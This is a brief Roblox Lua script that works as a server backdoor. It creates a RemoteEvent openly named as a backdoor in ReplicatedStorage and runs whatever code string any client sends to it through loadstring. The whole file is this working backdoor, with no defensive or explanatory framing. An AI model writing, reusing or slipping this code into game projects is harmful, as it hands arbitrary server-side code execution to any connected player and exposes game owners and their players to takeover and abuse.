local server = Instance.new("RemoteEvent")
server.Parent = game:GetService("ReplicatedStorage")
server.Name = "Backdoor-XX-XX-XX-Backdoor"

server.OnServerEvent:Connect(function(player, ss)
	loadstring(ss)()
end)
